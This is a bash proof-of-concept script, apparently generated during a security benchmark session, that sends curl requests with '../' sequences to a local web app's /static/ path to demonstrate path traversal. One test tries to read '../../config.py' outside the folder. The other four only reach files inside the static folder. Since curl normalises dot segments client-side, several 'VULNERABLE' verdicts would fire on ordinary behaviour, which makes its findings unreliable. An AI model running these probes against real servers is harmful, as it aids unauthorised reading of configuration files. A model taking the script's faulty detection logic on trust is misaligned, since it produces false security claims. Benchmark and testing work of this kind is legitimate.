#!/bin/bash
# POC: Demonstrates path traversal vulnerability in static file serving by accessing files across different subdirectories within the static folder using ../ sequences
# Target: ./repo
# Created: 2025-11-05T16:55:17.911Z
# Session: benchmark-XBEN-047-24-mhm7is0w

# Path Traversal Vulnerability POC - Static File Serving
# Tests the ability to traverse directories within the /static/ folder using ../ sequences

TARGET_HOST="${1:-localhost}"
TARGET_PORT="${2:-5001}"
BASE_URL="http://${TARGET_HOST}:${TARGET_PORT}"

echo "=========================================="
echo "Path Traversal POC - Static Files"
echo "=========================================="
echo "Target: ${BASE_URL}"
echo ""

# Test 1: Cross-directory traversal - accessing CSS from img/cookies
echo "[TEST 1] Cross-directory traversal: img/cookies/../../css/style.css"
RESPONSE1=$(curl -s -w "\n%{http_code}" "${BASE_URL}/static/img/cookies/../../css/style.css")
HTTP_CODE1=$(echo "$RESPONSE1" | tail -n 1)
BODY1=$(echo "$RESPONSE1" | head -n -1)
CONTENT_LENGTH1=$(echo "$BODY1" | wc -c)

echo "HTTP Status: $HTTP_CODE1"
echo "Content Length: $CONTENT_LENGTH1 bytes"
if [ "$HTTP_CODE1" == "200" ]; then
    echo "✓ VULNERABLE: Successfully accessed /static/css/style.css via path traversal"
    echo "Content preview (first 100 chars):"
    echo "$BODY1" | head -c 100
    echo ""
else
    echo "✗ NOT VULNERABLE: Got HTTP $HTTP_CODE1"
fi
echo ""

# Test 2: Alternative path traversal - accessing image via assets
echo "[TEST 2] Alternative traversal: assets/../img/cookies/new_star.png"
RESPONSE2=$(curl -s -i "${BASE_URL}/static/assets/../img/cookies/new_star.png" 2>&1)
HTTP_CODE2=$(echo "$RESPONSE2" | grep "HTTP/" | awk '{print $2}')
CONTENT_LENGTH2=$(echo "$RESPONSE2" | grep -i "Content-Length:" | awk '{print $2}' | tr -d '\r')

echo "HTTP Status: $HTTP_CODE2"
echo "Content Length: $CONTENT_LENGTH2 bytes"
if [ "$HTTP_CODE2" == "200" ]; then
    echo "✓ VULNERABLE: Successfully accessed image via path traversal"
else
    echo "✗ NOT VULNERABLE: Got HTTP $HTTP_CODE2"
fi
echo ""

# Test 3: Complex multi-level traversal
echo "[TEST 3] Complex multi-level traversal: img/cookies/../../css/xss/index.css"
RESPONSE3=$(curl -s -w "\n%{http_code}" "${BASE_URL}/static/img/cookies/../../css/xss/index.css")
HTTP_CODE3=$(echo "$RESPONSE3" | tail -n 1)
BODY3=$(echo "$RESPONSE3" | head -n -1)

echo "HTTP Status: $HTTP_CODE3"
if [ "$HTTP_CODE3" == "200" ]; then
    echo "✓ VULNERABLE: Successfully accessed /static/css/xss/index.css via complex traversal"
    echo "Content Length: $(echo "$BODY3" | wc -c) bytes"
else
    echo "✗ NOT VULNERABLE: Got HTTP $HTTP_CODE3"
fi
echo ""

# Test 4: Self-reference traversal
echo "[TEST 4] Self-reference traversal: css/./style.css"
RESPONSE4=$(curl -s -w "\n%{http_code}" "${BASE_URL}/static/css/./style.css")
HTTP_CODE4=$(echo "$RESPONSE4" | tail -n 1)

echo "HTTP Status: $HTTP_CODE4"
if [ "$HTTP_CODE4" == "200" ]; then
    echo "✓ File accessible via self-reference (./) path"
else
    echo "✗ Got HTTP $HTTP_CODE4"
fi
echo ""

# Test 5: Attempt to escape static directory (should be blocked)
echo "[TEST 5] Attempt to escape static directory: ../config.py"
RESPONSE5=$(curl -s -w "\n%{http_code}" "${BASE_URL}/static/../../config.py")
HTTP_CODE5=$(echo "$RESPONSE5" | tail -n 1)

echo "HTTP Status: $HTTP_CODE5"
if [ "$HTTP_CODE5" == "403" ] || [ "$HTTP_CODE5" == "404" ]; then
    echo "✓ PROTECTED: Escape attempt properly blocked"
else
    echo "⚠ WARNING: Got HTTP $HTTP_CODE5 (escape may be possible)"
fi
echo ""

# Summary
echo "=========================================="
echo "VULNERABILITY SUMMARY"
echo "=========================================="
VULN_COUNT=0
[ "$HTTP_CODE1" == "200" ] && VULN_COUNT=$((VULN_COUNT+1)) && echo "✓ Test 1: Cross-directory traversal CONFIRMED"
[ "$HTTP_CODE2" == "200" ] && VULN_COUNT=$((VULN_COUNT+1)) && echo "✓ Test 2: Alternative path traversal CONFIRMED"
[ "$HTTP_CODE3" == "200" ] && VULN_COUNT=$((VULN_COUNT+1)) && echo "✓ Test 3: Complex multi-level traversal CONFIRMED"
[ "$HTTP_CODE4" == "200" ] && VULN_COUNT=$((VULN_COUNT+1)) && echo "✓ Test 4: Self-reference traversal CONFIRMED"
[ "$HTTP_CODE5" != "200" ] && echo "✓ Test 5: Directory escape protection working"

echo ""
echo "Vulnerabilities Confirmed: $VULN_COUNT/4"
if [ $VULN_COUNT -ge 2 ]; then
    echo "RESULT: Path traversal vulnerability CONFIRMED"
    exit 0
else
    echo "RESULT: Path traversal vulnerability NOT CONFIRMED"
    exit 1
fi